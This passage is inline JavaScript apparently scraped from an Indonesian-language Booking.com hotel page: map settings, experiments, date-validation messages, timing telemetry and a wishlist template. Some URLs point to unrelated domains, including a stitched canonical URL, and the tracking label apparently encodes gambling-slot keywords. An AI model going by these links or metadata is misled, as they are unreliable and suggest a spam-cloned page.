'3.5281994834269,98.7450941116749,3.5641303165731,98.7811602883251',b_companyname: "Booking.com",b_site_info:{"is_iam_auth_allowed":1,"is_bookings_owned":1},b_updated_bbox:false,b_hotel_id_to_wishlists_count:{},LOCATION_DISPUTED_TERRITORIES:true, b_district_ids_to_polygon:{}, b_filter_bboxes:{}, b_site_type: 'www', b_search_config:{"b_adults_total":2,"b_pets_total":null,"b_abnormal_params":0,"b_nr_rooms_needed":1,"traveller_segment":"couple","b_children_ages_total":[],"autosplit":1,"b_rooms":[{"b_adults":2,"b_children_ages":[],"b_children":0,"b_room_order":1}],"b_children_total":0,"b_is_group_search":0}, b_feature_running_LOCATION_MAP_GOALS_WITH_VALUES: !!+'1',b_dest_type: '', b_param_map: '', debug:0/**/
/* jshint ignore:end */ }; B.atlas.__env__ = env; function get(item) { return item ? env[item] : undefined; } /**/ return { get: get }; }); }()); /**/
maps.assert = {
'tdot': false,
'tdot_using_desktop': false,
'sr': false,
'hp': true,
'wl': false,
'lp': false,
'ieGt7': false,
'disambiguation': false,
'corsCapable': true
};
(function() {
var maps = booking.maps || booking.atlas;
var env = maps.require('util-env');
if (!maps) {
return;
}
booking.env.b_lang = 'id';
booking.env.b_map_dest_type = 'hotel';
booking.env.b_map_dest_id = '14770538';
booking.env.current_hotel = '';
booking.env.map_more_params = '';
booking.env.autocomplete_more_params = '';
booking.env.touch_map_infowindow_close = '';
booking.env.b_icons_url = 'https://cf.bstatic.com/static/img';
booking.env.b_map_nights = '';
booking.env.b_domestic_booker = '1';
booking.env.b_guest_country = 'id';
booking.env.b_city_has_metro_access = '0';
booking.env.b_city_has_rail_access = '0';
booking.env.b_has_valid_dates = '';
booking.env.b_has_valid_dates_not_in_past = '';
booking.env.b_is_high_value_customer_ski_exp = '';
booking.env.b_is_potential_high_value_customer_ski_exp = '';
booking.env.b_is_low_present_value_customer_ski_exp = '';
booking.env.b_is_new_value_customer_ski_exp = '';
booking.env.b_is_no_fusion_match_value_customer_ski_exp = '';
maps.EXPERIMENTS = [
{
name: 'YdXfdKNKNKPZZKCBZGLGWe',
cond: '1',
stages: [
{
stage: 1,
event: 'ready'
}
]
},
{
name: 'PUTIFOLNYWLHJYWYHAbVNURe',
cond: '',
stages: [
{
stage: 1,
event: 'markers-ready'
},
{
stage: 2,
event: 'markers-ready',
cond: ''
},
{
stage: 3,
event: 'markers-ready',
cond: ''
},
{
stage: 4,
event: 'markers-ready',
cond: ''
},
{
stage: 5,
event: 'markers-ready',
cond: '1'
},
{
stage: 6,
event: 'markers-ready',
cond: ''
},
{
stage: 7,
event: 'markers-ready',
cond: ''
},
{
stage: 8,
event: 'markers-ready',
cond: ''
},
{
stage: 9,
event: 'markers-ready',
cond: ''
}
],
goals: [
{
goal: 1,
event: 'marker-click',
cond: function(e){
return e.type === 'beach';
}
},
{
goal: 2,
event: 'marker-click',
cond: function(e){
return e.type === 'hotel';
}
},
{
goal: 3,
event: 'marker-hover',
cond: function(e){
return e.type === 'beach';
}
},
{
goal: 4,
event: 'marker-hover',
cond: function(e){
return e.type === 'hotel';
}
}
]
},
// start: wishlist AAs
{
name: 'BKATYDORMTfFIdOccPDXKe',
cond: `
1
`,
stages: [
{
stage: 3,
event: 'ready',
cond: ''
},
{
stage: 4,
event: 'ready',
cond: '1'
},
{
stage: 7,
event: 'ready',
cond: ''
},
]
},
{
name: 'BKATYDORMTfFIdOccPDXafBQEQJET',
cond: `
`,
stages: [
{
stage: 5,
event: 'ready',
cond: ''
}
]
},
{
name: 'BKATYDORMTfFIdOccPDXafBQEQSVWe',
cond: `
1
`,
stages: [
{
stage: 5,
event: 'ready',
cond: ''
}
]
},
// end: wishlist AAs
].map(function(exp) {
exp.mapId = exp.mapId || 'default';
return exp;
});
}());
maps.TEMPLATES = {};
}());
booking.env.b_url_start = 'https://www.booking.com';
// Counting login page visitors
B.env.static_hostnames = ['https://cf.bstatic.com'];
var calendar = new Object();
var tr = new Object();
tr.nextMonth = "Bulan depan";
tr.prevMonth = "Bulan sebelumnya";
tr.closeCalendar = "Tutup kalender";
tr.pressCtlD = "Tekan ctrl-d atau memilih penanda (bookmarks)/menambah atau favorit(add or favorites)/tambahkan(add) di browser Anda";
tr.pressCtlP = "Tekan ctrl-p atau memilih file / print di browser Anda";
tr.url = "https://nikoenergyltd.com/our-videos/?aid=356980&label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&sid=7ddc46c9c1086cdb3bc11bc91f12833b&room1=A%2CA;sb_price_type=total;type=total&";
tr.title = "Booking.com Selamat Datang";
tr.icons = "https://cf.bstatic.com/static/img";
var months = ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','November','Desember'];
var $t_hotels = 'Hotel'.toLowerCase();
var $t_hotels_around = 'Akomodasi di dekatnya'.toLowerCase().replace(/ /g, '&#160;');
var b_today = "Hari ini";
if ( document.getElementById ) {
var shown = new Array();
}
function blocktoggle(sToggle) {
var sToggleId = '#blocktoggle' + sToggle;
$(sToggleId).toggle();
}
function blockdisplay(i) {
var body = $( document.body );
if (document.getElementById("blockdisplay" + i)) {
for (var j = 1; j <= 4; j++) {
if (document.getElementById('blockdisplay' + j)) {
document.getElementById('blockdisplay' + j).style.display = (j === i) ? 'block' : 'none';
}
}
body.trigger((i == 4) ? 'ReviewsTab_onOpen' : 'ReviewsTab_onClose')
.trigger( 'RT:reset' );
( booking.eventEmitter || $( window ) )
.trigger( 'BLOCKDISPLAY' + i + '.OPEN' );
if (i === 1 && typeof bMovableBookNowButton != "undefined") {
bMovableBookNowButton.init();
}
}
}
function popup( url, w, h ) {
newWindow = window.open( url, 'popupWindow', 'width=' + w + ',height=' + h + ',menubar=no,toolbar=no,location=no,bookmarks=no,status=no,scrollbars=yes,resizable=yes' );
if ( window.focus ) {
newWindow.focus();
}
}
booking.ensureNamespaceExists( 'env' );
booking.env.b_checkin_date = '';
booking.env.b_session_checkin_date = '';
booking.env.b_checkout_date = '';
booking.env.b_session_checkout_date = '';
booking.env.b_no_dates_mode = '';
booking.env.b_months = [{"b_number": +"9","name":'September'},{"b_number": +"10","name":'Oktober'},{"b_number": +"11","name":'November'},{"b_number": +"12","name":'Desember'},{"b_number": +"1","name":'Januari'},{"b_number": +"2","name":'Februari'},{"b_number": +"3","name":'Maret'},{"b_number": +"4","name":'April'},{"b_number": +"5","name":'Mei'},{"b_number": +"6","name":'Juni'},{"b_number": +"7","name":'Juli'},{"b_number": +"8","name":'Agustus'},{"b_number": +"9","name":'September'},{"b_number": +"10","name":'Oktober'},{"b_number": +"11","name":'November'},{"b_number": +"12","name":'Desember'}];
(function() {
var months = booking.env.b_months;
if ( months.length >= 12 ) {
booking.env.b_months = months.slice( 0, 12 );
}
})();
booking.env.b_this_year4 = 2025;
booking.env.b_this_month = 9;
booking.env.b_this_day = 27;
booking.env.date_format_acronym = "TTTT-BB-HH";
booking.env.day = "hari";
booking.env.sbox_day = "Hari";
booking.env.sbox_month = "Bulan";
booking.env.error.checkin_date_in_the_past = {
"name" : "Tanggal check-in Anda telah lewat. Silakan periksa kembali tanggal Anda lalu coba lagi. "
};
booking.env.error.checkin_date_invalid = {
"name" : "Tanggal check-in Anda tidak valid."
};
booking.env.error.checkin_date_to_far_in_the_future = {
"name" : "Tanggal check-in Anda terlalu jauh di masa depan. Silakan coba lagi. "
};
booking.env.error.checkout_date_invalid = {
"name" : "Tanggal keberangkatan Anda sepertinya salah."
};
booking.env.error.checkout_date_more_than_30_days_after_checkin = {
"name" : "Tanggal check-out Anda melebihi 30 malam setelah tanggal check-in Anda. Pemesanan hanya bisa dilakukan untuk periode maksimal 30 malam. Silakan masukkan tanggal yang berbeda lalu coba lagi. "
};
booking.env.error.checkout_date_not_after_checkin_date = {
"name" : "Tanggal check-out Anda lebih awal daripada tanggal check-in. Silakan cek tanggal Anda lalu coba lagi."
};
booking.env.error.not_specific_enough = {
"name" : "Maaf, kami memerlukan setidaknya sebagian dari nama tujuan untuk mulai mencari"
};
booking.env.error.checkin_in_past_error_suggest_tonight = {
"name" : "Tanggal check-in Anda sudah lewat. Cari untuk malam ini atau silakan masukkan tanggal baru."
};
booking.env.month = "Bulan";
booking.env.please_enter_your_check_in_date = "Harap masukkan tanggal check-in Anda.";
booking.env.please_enter_your_check_out_date = "Harap masukkan tanggal check-out Anda.";
booking.env.s_value_checkin_year_month = '';
booking.env.s_value_checkout_year_month = '';
booking.env.sb_flexi_srch_month_validation = "Harap pilih bulan";
booking.env.to_check_availability_please_enter_your_dates_of_stay = "Masukkan tanggal untuk memeriksa ketersediaan.";
booking.env.checkout_date_not_after_checkin_date = "Harap periksa tanggal Anda, tanggal check-out sepertinya lebih awal daripada tanggal check-in.";
booking.env.b_room_groups = [];
booking.env.b_room_extrabeds = [];
booking.env.error.hp_dates_in_the_past = {
"name" : "Silakan pilih tanggal sekarang atau yang akan datang untuk check-in dan check-out."
};
booking.env.error.hp_same_day_checkin_checkout = {
"name" : "Pastikan tanggal check-out Anda paling tidak 1 hari setelah check-in."
};
booking.env.domain_for_book = 'https://secure.booking.com';
booking.env.b_query_params_with_lang = '.id.html?aid=356980&label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&sid=7ddc46c9c1086cdb3bc11bc91f12833b';
booking.env.b_canonical_url = 'https:&#47;&#47;www.booking.com&#47;hotel&#47;id&#47;tresorsdafrique.com/en/categorie-produit/coffees/';
booking.env.b_canonical_url_delimiter = '?';
booking.env.b_query_params_delimiter = '&amp;';
booking.env.group_room = 'Kamar';
booking.env.group_remove = 'Hapus';
booking.env.valdateDates_msg = 'Untuk melihat kamar dan harga yang tersedia, silakan masukkan tanggal check-in dan check-out Anda.';
booking.env.b_hotel_blocks = 0;
booking.env.hide_bpg = '';
var transl_content_feedback_thankyou_short = 'Terima kasih untuk kritik dan saran Anda';
booking.env.tab = '';
booking.env.b_save_user_hotel_interactions = 1;
booking.env.b_room_group = [
];
booking.env.s_value_ss = "";
booking.env.s_value_ss_raw = "";
booking.env.close_button = "TUTUP";
booking.env.next_button = "Selanjutnya";
booking.env.prev_button = "Sebelumnya";
booking.env.book_button = "Pesan sekarang";
booking.env.date_format_acronym = "TTTT-BB-HH";
booking.env.sunday_first = 1;
booking.env.experiment_popups_close = 'Tutup';
booking.env.a11y_dialog_content_start_text = 'Awal konten dialog';
booking.env.a11y_dialog_content_end_text = 'Akhir konten dialog';
booking.env.city_name_en = '';
booking.env.b_urlcity = 'Yogyakarta';
booking.env.child_age_text = "Harap masukkan usia anak (0 sampai 17 tahun).";
booking.env.b_stid = 356980;
booking.env.b_new_ga_track = 1;
booking.env.prd_bpg_overlay_cs_link = '<a class="bui-link" href="https://secure.booking.com/help.id.html?aid=356980&label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&sid=7ddc46c9c1086cdb3bc11bc91f12833b&source=price_match#/?source=price_match" target="_blank" data-ga-track="click|Click|Action: hotel|hc_entrypoint_price_match">';
</script>
<script type="text/javascript" nonce="cH3DZKVyvb8x5Uh">
var currencyFormat = {
symbol: "Rp",
symbol_position: "before",
decimals: "2",
decimal_separator: ",",
currency_separator: " ",
group_separator: "."
};
</script>
<script nonce="cH3DZKVyvb8x5Uh">
if (window.performance && performance.setResourceTimingBufferSize) {
performance.setResourceTimingBufferSize(500);
}
;(function nav_timing(w){ 'use strict'; function validMetric(value) { return !isNaN(value) && value >= 0 && value < 150000 || false; } function callback() { var performance = w.performance || w.mozPerformance || w.msPerformance || w.webkitPerformance || {}, navigation = performance.navigation, timing = performance.timing, hasGetEntries = !!performance.getEntriesByType, userTiming = []; if ( typeof timing !== 'object' || typeof navigation !== 'object' || 1 ) { return; } if ( timing.loadEventEnd == 0 ) { setTimeout(callback, 1000); return; } var domain = validMetric(timing.domainLookupEnd - timing.domainLookupStart), connect = validMetric( timing.connectEnd - timing.connectStart), response = validMetric( timing.responseEnd - timing.responseStart), dom = validMetric( timing.domComplete - timing.domLoading), load = validMetric( timing.loadEventEnd - timing.loadEventStart); if ( !domain || !connect || !response || !dom || !load || w._phantom || w.callPhantom || w.__phantomas || window.Buffer || window.emit || window.spawn ) { return false; } if (typeof RUMSpeedIndex === 'function') { var speedIndex; try { speedIndex = Math.round(RUMSpeedIndex()); } catch (e) { B.reportError && B.reportError(e, 'speedindex'); } if (speedIndex) { if (window.ga) { setTimeout(function(){ ga('send', 'timing', 'Performance', 'SpeedIndex', speedIndex, B.env['b_action']); }, 100); } userTiming.push('speedindex:' + speedIndex); } } if (hasGetEntries) { var utMetrics = performance.getEntriesByType('measure') || []; for ( var _tmp, _i = 0, _l = utMetrics.length; _i < _l; _i++ ) { _tmp = utMetrics[_i]; userTiming.push(_tmp['name'] + ':' + Math.round(_tmp['duration'])); } } var navTimesHost = '/navigation_times', navTimesQuery = 'sid=7ddc46c9c1086cdb3bc11bc91f12833b&pid=a8c81d0eb7550190&nts=' + navigation.type + ',' + navigation.redirectCount + ',' + timing.navigationStart + ',' + timing.unloadEventStart + ',' + timing.unloadEventEnd + ',' + timing.redirectStart + ',' + timing.redirectEnd + ',' + timing.fetchStart + ',' + timing.domainLookupStart + ',' + timing.domainLookupEnd + ',' + timing.connectStart + ',' + timing.connectEnd + ',' + timing.secureConnectionStart + ',' + timing.requestStart + ',' + timing.responseStart + ',' + timing.responseEnd + ',' + timing.domLoading + ',' + timing.domInteractive + ',' + timing.domContentLoadedEventStart + ',' + timing.domContentLoadedEventEnd + ',' + timing.domComplete + ',' + timing.loadEventStart + ',' + timing.loadEventEnd + ',0' + '&first=' + '&cdn=cf' + '&dc=32' + '&bo=17' + '&lang=id' + '&ref_action=hotel' + '&aid=356980' + '&stype=1' + '&route=' + '&ua=17' + '&ch=d' + '&lt=' + '&css_load=' + (window.mainCssWasLoaded || 0) + '&wn=1' ; var navTimesBody = 'utiming=' + userTiming.join(','); var _req = new XMLHttpRequest(); _req.open('POST', navTimesHost + '?' + navTimesQuery); _req.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); _req.setRequestHeader('X-Booking-CSRF', 'XJvXaAAAAAA=CX4s0D3iyg_iRUuMf2iAsA1zXpCWWiDymbBvzH2ABQjTszO3mfTCYHHUwSJCfLs6ukyO3JHkVWlP_MW02hTuSsNl1-Ru8GTcV_Y4CC0qmOXJl6Fdl-0tPC8r8z6HBK1fIFuAnDquEPeMiNr2jwIC4paXij0E9cBqLmEYbe9YAN1ZjwZtIOctNDR7sMeXwVN0I6spkMtq322zhFeC'); _req.send(navTimesBody); }; B.env.fe_new_perf_tracking = { first_visit: '', params: { cdn: 'cf', dc: '32', bo: '17', route: '' } }; if( B.env.fe_new_perf_tracking_callback ) { B.env.fe_new_perf_tracking_callback(); } if ( typeof w.attachEvent != "undefined" ) { w.attachEvent("onload", callback); } else if ( w.addEventListener ) { w.addEventListener("load", callback, false); } })(window); </script> 
<script defer nonce="cH3DZKVyvb8x5Uh"> ;(function(w,d){ 'use strict'; var hasSessionStorage; try { if ('sessionStorage' in w ) { w.sessionStorage.setItem('trying', 1); var check = w.sessionStorage.getItem('trying'); if (check) { w.sessionStorage.removeItem('trying'); hasSessionStorage = true; } } } catch (e) {}; if(!hasSessionStorage || w.sessionStorage.getItem('preloaded') ) { return false; } var preload = function(){ var _preload = function () { var iframe = d.createElement('iframe'); iframe.setAttribute('width','1'); iframe.setAttribute('height','1'); iframe.setAttribute('style','height:0px;width:1px;overflow:hidden;visibility:hidden;position:absolute;'); iframe.setAttribute('frameborder','0'); iframe.setAttribute('border','0'); iframe.src="https://secure.booking.com/general.id.html?aid=356980&label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&sid=7ddc46c9c1086cdb3bc11bc91f12833b;tmpl=preload_assets"; d.body.appendChild(iframe); w.sessionStorage.setItem('preloaded','1'); }; w.setTimeout(_preload, 6000); }; if (w.addEventListener) { w.addEventListener('load', preload, false); } else if (w.attachEvent) { w.attachEvent('onload', preload); } }(window, document)); </script> 
<svg class="bk-icon -iconset-heart" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M64 112a3.6 3.6 0 0 1-2-.5 138.8 138.8 0 0 1-44.2-38c-10-14.4-10.6-26-9.4-33.2a29 29 0 0 1 22.9-23.7c11.9-2.4 24 2.5 32.7 13a33.7 33.7 0 0 1 32.7-13 29 29 0 0 1 22.8 23.7c1.3 7.2.6 18.8-9.3 33.3-9.1 13.1-24 25.9-44.2 37.9a3.6 3.6 0 0 1-2 .5z"/></svg>
<svg class="bk-icon -iconset-heart_outline" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M119.5 40.3a29 29 0 0 0-22.8-23.7 33.8 33.8 0 0 0-32.7 13 33.7 33.7 0 0 0-32.7-13A29 29 0 0 0 8.5 40.3c-1.3 7.2-.6 18.8 9.4 33.3A140 140 0 0 0 62 111.5a3.7 3.7 0 0 0 4 0c20.2-12 35-24.8 44.1-38 10-14.4 10.7-26 9.5-33.2zm-55.5 63c-33-20.1-50.8-43-47.7-61.6A20.7 20.7 0 0 1 33 24.3a22.3 22.3 0 0 1 4.5-.4c8.8 0 17.3 5.2 23.2 14.6a4 4 0 0 0 3.4 1.8 4 4 0 0 0 3.4-1.8c6-9.4 14.4-14.6 23.2-14.6a22.3 22.3 0 0 1 4.5.5 20.7 20.7 0 0 1 16.6 17.2c3 18.6-14.8 41.6-47.8 61.7z"/></svg>
<svg class="bk-icon -streamline-loading" height="24" style="display:none;" width="24" viewBox="0 0 24 24" role="presentation" aria-hidden="true" focusable="false"><path d="M11.25.747v3.75a.75.75 0 0 0 1.5 0V.747a.75.75 0 0 0-1.5 0zm1.5 22.5v-3.75a.75.75 0 0 0-1.5 0v3.75a.75.75 0 0 0 1.5 0zM3.515 4.572l2.652 2.652a.75.75 0 0 0 1.06-1.06L4.575 3.512a.75.75 0 0 0-1.06 1.06zm16.97 14.85l-2.652-2.651a.75.75 0 1 0-1.06 1.06l2.652 2.651a.75.75 0 1 0 1.06-1.06zM.75 12.747H4.5a.75.75 0 0 0 0-1.5H.75a.75.75 0 0 0 0 1.5zm22.5-1.5H19.5a.75.75 0 0 0 0 1.5h3.75a.75.75 0 0 0 0-1.5zM4.575 20.482l2.652-2.65a.75.75 0 1 0-1.06-1.061l-2.652 2.65a.75.75 0 1 0 1.06 1.061zm14.85-16.97l-2.652 2.652a.75.75 0 0 0 1.06 1.06l2.652-2.652a.75.75 0 0 0-1.06-1.06z"/></svg>
<svg class="bk-icon -iconset-navarrow_down_bold" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M101.7 42.3a8 8 0 0 0-11.4 0L64 68.7 37.7 42.3a8 8 0 0 0-11.4 11.4L64 91.3l37.7-37.6a8 8 0 0 0 0-11.4z"/></svg>
<svg class="bk-icon -iconset-loading" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="m64 8a4.67 4.67 0 0 1 4.67 4.67v18.66a4.67 4.67 0 0 1 -4.67 4.67 4.67 4.67 0 0 1 -4.67-4.67v-18.66a4.67 4.67 0 0 1 4.67-4.67z" opacity=".75"/><path d="m92 15.48a4.67 4.67 0 0 1 1.71 6.37l-9.34 16.15a4.67 4.67 0 0 1 -6.37 1.72 4.67 4.67 0 0 1 -1.71-6.37l9.33-16.17a4.67 4.67 0 0 1 6.38-1.7z" opacity=".2"/><path d="m112.52 36a4.67 4.67 0 0 1 -1.71 6.37l-16.16 9.34a4.67 4.67 0 0 1 -6.37-1.71 4.67 4.67 0 0 1 1.72-6.37l16.17-9.33a4.67 4.67 0 0 1 6.35 1.7z" opacity=".25"/><path d="m120 64a4.67 4.67 0 0 1 -4.67 4.67h-18.66a4.67 4.67 0 0 1 -4.67-4.67 4.67 4.67 0 0 1 4.67-4.67h18.67a4.67 4.67 0 0 1 4.66 4.67z" opacity=".3"/><path d="m112.52 92a4.67 4.67 0 0 1 -6.37 1.71l-16.15-9.34a4.67 4.67 0 0 1 -1.72-6.37 4.67 4.67 0 0 1 6.37-1.71l16.17 9.33a4.67 4.67 0 0 1 1.7 6.38z" opacity=".35"/><path d="m92 112.52a4.67 4.67 0 0 1 -6.37-1.71l-9.34-16.16a4.67 4.67 0 0 1 1.71-6.37 4.67 4.67 0 0 1 6.37 1.72l9.33 16.17a4.67 4.67 0 0 1 -1.7 6.35z" opacity=".4"/><path d="m64 120a4.67 4.67 0 0 1 -4.67-4.67v-18.66a4.67 4.67 0 0 1 4.67-4.67 4.67 4.67 0 0 1 4.67 4.67v18.67a4.67 4.67 0 0 1 -4.67 4.66z" opacity=".45"/><path d="m36 112.52a4.67 4.67 0 0 1 -1.71-6.37l9.34-16.15a4.67 4.67 0 0 1 6.37-1.72 4.67 4.67 0 0 1 1.71 6.37l-9.33 16.17a4.67 4.67 0 0 1 -6.38 1.7z" opacity=".5"/><path d="m15.48 92a4.67 4.67 0 0 1 1.71-6.37l16.17-9.33a4.67 4.67 0 0 1 6.36 1.7 4.67 4.67 0 0 1 -1.72 6.37l-16.15 9.34a4.67 4.67 0 0 1 -6.37-1.71z" opacity=".55"/><path d="m8 64a4.67 4.67 0 0 1 4.67-4.67h18.66a4.67 4.67 0 0 1 4.67 4.67 4.67 4.67 0 0 1 -4.67 4.67h-18.66a4.67 4.67 0 0 1 -4.67-4.67z" opacity=".6"/><path d="m15.48 36a4.67 4.67 0 0 1 6.37-1.71l16.15 9.34a4.67 4.67 0 0 1 1.72 6.37 4.67 4.67 0 0 1 -6.37 1.71l-16.17-9.34a4.67 4.67 0 0 1 -1.7-6.37z" opacity=".65"/><path d="m36 15.48a4.67 4.67 0 0 1 6.37 1.71l9.33 16.17a4.67 4.67 0 0 1 -1.7 6.36 4.67 4.67 0 0 1 -6.37-1.72l-9.34-16.15a4.67 4.67 0 0 1 1.71-6.37z" opacity=".7"/></svg>
<script type='text/javascript' nonce="cH3DZKVyvb8x5Uh">
booking.jstmpl('lists_hotel_dropdown', (function () { var T = ["\n","\n\u003cdiv class=\"preloader-state-icon\"\u003e\n","iconset/loading","\n\u003c/div\u003e\n","\n\u003cdiv class=\"wl-dropdown-saved-to-message\" aria-hidden=\"true\"\u003e\n","/private/cdm_web_sr_compare_checkbox_saved/name","\n\u003ca href=\"","\" class=\"js-open-list\" target=\"_blank\"\u003e\n","\n\u003c/a\u003e\n","\n\u003cdiv class=\"dmw_sr_wl_dd_expand_trigger\"\u003e\n\u003ca href=\"#0\" class=\"bui-link bui-link--secondary js-sr-wl-expand-trigger\"\u003eChange\u003c/a\u003e\n","iconset/navarrow_down_bold","smaller","\n\u003c/div\u003e\n\u003cdiv class=\"dmw_sr_wl_dd_collapsed\"\u003e\n","\n\u003cdiv class=\"bui-group\" role=\"group\"\u003e\n","\n\u003clabel\nclass=\"\nwl-dropdown-item\njs-wl-dropdown-item\n","\nwl-dropdown-item_shared\n","\nbui-checkbox\n","\nwl-dropdown-item--added\n","\n\"\naria-label=\"","/private/a11y_hp_bookmarks_shared/name","\"\n\u003e\n\u003cinput\ntype=\"checkbox\"\ndata-list-id=\"","\"\nid=\"wl_item_","\"\nclass=\"js-wl-dropdown-item-checkbox wl-dropdown-item__checkbox bui-checkbox__input\"\n","checked=\"checked\"","\n/\u003e\n\u003cspan id=\"wl_checkbox_label_","\" class=\"bui-checkbox__label\n","wl-dropdown-item__name--last-used","\"\u003e\n","\n\u003c/span\u003e\n\u003cspan\nclass=\"\nwl-dropdown-link-wrapper\n","g-hidden","g-hidden-2","\n\"\n\u003e\n"," - ","\n\u003ca\nclass=\"","wl-dropdown-link js-open-list ","\"\ntarget=\"_blank\"\nhref=\"","\"\naria-describedby=\"wl_checkbox_label_","\"\n\u003e\n","\n\u003cspan aria-label=\"","\"\u003e\u003c/span\u003e\n\u003c/a\u003e\n\u003c/span\u003e\n\u003c/label\u003e\n","\n\u003clabel class=\"wl-dropdown-item wl-dropdown-item_new js-wl-dropdown-item-new bui-checkbox\"\u003e\n\u003cinput\ntype=\"checkbox\"\ndata-list-id=\"\"\ndisabled=\"disabled\"\nclass=\"js-wl-dropdown-item-checkbox wl-dropdown-item__checkbox bui-checkbox__input\"\naria-hidden=\"true\"\n/\u003e\n\u003cspan class=\"bui-checkbox__label\"\u003e\n\u003cinput\ntype=\"text\"\nplaceholder=\"","\"\nclass=\"js-wl-dropdown-item-text force-focusable wl-dropdown-item__text bui-form__control\"\naria-label=\"","/private/a11y_hp_bookmarks_name_new/name","\"\n\u003e\n\u003c/span\u003e\n\u003c/label\u003e\n"], V = ["loading_list","lists","fe_show_saved_message","fe_wl_sr_saw_dropdow","b_user_auth_level_is_low_or_high","is_collaborated","selected","name","id","lastUsed","b_action","b_is_tdot_traffic","url","go_to_list","wishlist_create_new","b_reg_user_wishlist_remaining"], WV, LV, VA; return function (VS) { var s = '', r = this.fn; s += T[0]; if (r.MJ(r.MB(V[0]))) { s += [ T[1],             ( VS.unshift({'name': T[2]}), (VA = r.HELPER("icon", VS[0])), VS.shift(), VA ) , T[3] ].join( '' ); } s += T[0]; if (! (r.MD(V[0]))) { s += T[0]; if (r.MD(V[2])) { s += [ T[4], r.ME(T[5], r.MB, r.MN, null), T[0] ].join( '' ); { var LA= ( r.MC(V[1]) || [] ); VS.unshift({'list': null}); for(var LC=1, LM= LA.length, LV_list; LC <= LM; LC++) { VS[0]['list']= LV_list= LA[LC - 1]; s += T[0]; if (r.MJ(r.MG((LV_list || {})["selected"] ))) { s += [ T[6], r.F['html']((LV_list || {})["url"]), T[7], r.F['js'](r.F['html']((LV_list || {})["name"])), T[8] ].join( '' ); } s += T[0]; } VS.shift(); } s += T[3]; } s += T[0]; if (( ( r.MJ(r.MB(V[2])) && r.MJ(r.MB(V[3])) ) && r.MJ(r.MC(V[4])) )) { s += [ T[9],                 ( VS.unshift({'color': "#fff", 'name': T[10], 'size': T[11]}), (VA = r.HELPER("icon", VS[0])), VS.shift(), VA ) , T[12] ].join( '' ); } s += T[13]; { var LA= ( r.MC(V[1]) || [] ); VS.unshift(null); for(var LC=1, LM= LA.length; LC <= LM; LC++) { VS[0]= LA[LC - 1]; s += T[14]; if (r.MD(V[5])) { s += T[15]; } s += T[16]; if (r.MD(V[6])) { s += T[17]; } s += T[18]; s += [ r.F['js'](r.F['html'](r.MB(V[7]))), T[0] ].join( '' ); if (r.MD(V[5])) { s += [ r.ME(T[19], r.MB, r.MN, null), T[0] ].join( '' ); } s += [ T[20], r.F['js'](r.F['html'](r.MB(V[8]))), T[21], r.F['js'](r.F['html'](r.MB(V[8]))), T[22] ].join( '' ); if (r.MD(V[6])) { s += T[23]; } s += [ T[24], r.F['js'](r.F['html'](r.MB(V[8]))), T[25] ].join( '' ); if (r.MD(V[9])) { s += T[26]; } s += [ T[27], r.F['js'](r.F['html'](r.MB(V[7]))), T[28] ].join( '' ); if (! (r.MD(V[6]))) { s += T[29]; } s += T[0]; if ((r.MJ( r.MC(V[10])  + "" === "" +  "searchresults" ))) { s += T[30]; } s += T[31]; if (r.MK(r.MC(V[11]))) { s += T[32]; } s += T[33]; s += T[34]; s += [ T[35], r.F['html'](r.MB(V[12])), T[36], r.F['js'](r.F['html'](r.MB(V[8]))), T[37], r.F['js'](r.F['html'](r.MB(V[13]))), T[38], r.F['js'](r.F['html'](r.MB(V[7]))), T[39] ].join( '' ); } VS.shift(); } s += T[0]; if (( r.MJ(r.MC(V[4])) && (r.MJ( r.MC(V[15])  >  0 )) )) { s += [ T[40], r.F['js'](r.F['html'](r.MB(V[14]))), T[41], r.ME(T[42], r.MB, r.MN, null), T[43] ].join( '' ); } s += T[3]; if (( ( r.MJ(r.MB(V[2])) && r.MJ(r.MB(V[3])) ) && r.MJ(r.MC(V[4])) )) { s += T[3]; } s += T[0]; } s += T[0]; return s; }; } )());
</script>
<script type='text/javascript' nonce="cH3DZKVyvb8x5Uh">
